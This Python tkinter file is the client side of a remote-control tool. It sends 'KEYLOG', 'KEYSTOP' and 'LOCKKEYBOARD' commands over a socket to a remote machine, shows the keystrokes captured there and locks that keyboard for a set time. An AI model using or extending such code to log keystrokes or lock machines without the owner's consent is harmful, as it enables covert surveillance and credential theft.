from tkinter import *
from tkinter import ttk
import threading
import socket
# pip install pillow
from PIL import Image, ImageTk
import keyboard
from pyautogui import scroll
from tkinter import messagebox

from timerGUI import TimerWindow

class KeyboardLock(Frame):
    def __init__(self,master,IP,port_no):
        Frame.__init__(self, master)
        self.master = Toplevel(master)
        self.master.columnconfigure(0, weight=1)
        self.master.columnconfigure(1, weight=1)
        self.master.resizable(FALSE, FALSE)

        self.timeCount = StringVar()
        self.ip=IP
        self.port_no=port_no

        self.labelLock = ttk.Label(self.master,text='Thời gian khóa bàn phím (s):')
        self.labelLock.grid(row=0,column=0,sticky='w',padx=10,pady=10)

        self.entryInput = ttk.Entry(self.master,width=20,textvariable=self.timeCount)
        self.entryInput.grid(row=0,column=1,sticky='w')


        self.clickButton = ttk.Button(self.master, text='Submit',command=self.submitLock)
        self.clickButton.grid(row=0,column=2,padx=10,pady=10,sticky='e')

    def load(self):
        self.master.wm_title('Lock a keyboard')
        self.master.mainloop()

    def submitLock(self):
        if self.timeCount.get().isalnum:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((self.ip, self.port_no))
            self.connection.send(f'LOCKKEYBOARD {self.timeCount.get()}'.encode())
            timerWindow = TimerWindow(int(self.timeCount.get()),self.master)
            timerWindow.submit()
            self.master.destroy()
        else:
            messagebox.showerror('Error','You input an invalid number')

class KeyloggerWindow(Frame):
    def __init__(self,master,ip,port_no):
        Frame.__init__(self, master)
        self.master=Toplevel(master)
        self.master.resizable(FALSE, FALSE)
        self.master.columnconfigure(0, weight=1)
        self.master.columnconfigure(1, weight=1)
        self.master.columnconfigure(2, weight=1)
        self.master.columnconfigure(3, weight=1)
        self.master.columnconfigure(4, weight=1)
        self.ip=ip
        self.port_no=port_no
    
        hookButton = ttk.Button(self.master, text='Hook',command=self.manageEventHook,style="Accent.TButton")
        hookButton.grid(row=0,column=0,padx=10,pady=5,sticky='news')

        unHookButton = ttk.Button(self.master, text='Unhook',command=self.eventUnhook)
        unHookButton.grid(row=0,column=1,padx=10,pady=5,sticky='news')
        
        printButton = ttk.Button(self.master, text='Print',command=self.eventPrint)
        printButton.grid(row=0,column=2,padx=10,pady=5,sticky='nwes')

        deleteButton = ttk.Button(self.master, text='Delete',command=self.eventDelete)
        deleteButton.grid(row=0,column=3,padx=10,pady=5,sticky='news')

        lockButton = ttk.Button(self.master, text='Lock',command=self.eventLock)
        lockButton.grid(row=0,column=4,padx=10,pady=5,sticky='news')


        #file status
        self.textMulti=Text(self.master)
        self.textMulti.grid(row=1,column=0,columnspan=5,padx=10,pady=10)
        self.textMulti.configure(state='disabled')


    def loadKeyLog(self):
        try:
            self.master.wm_title("Keylog and lock keyboard")
            self.master.mainloop()
        except:
            pass
    def manageEventHook(self):
        threading.Thread(target=self.eventHook).start()
    def eventHook(self):
        cmd = "KEYLOG"
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port_no))
        self.connection.send(cmd.encode())
        conn = self.connection
        while True:
            self.data = conn.recv(1024)
            if not self.data:
                break
            self.result = self.data.decode()
        
    def eventUnhook(self):
        cmd = "KEYSTOP"
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port_no))
        self.connection.send(cmd.encode())

    def eventPrint(self):
        try:
            self.textMulti.configure(state='normal')
            self.textMulti.insert(END,str(self.result))
            self.textMulti.configure(state='disabled')
            self.data=""      
        except:
            print('No')    
    def eventDelete(self):
        self.textMulti.configure(state='normal')
        self.textMulti.delete('1.0',END)
        self.textMulti.configure(state='disabled')
    def eventLock(self):
        lockGUI = KeyboardLock(self.master,self.ip,self.port_no)
        lockGUI.load()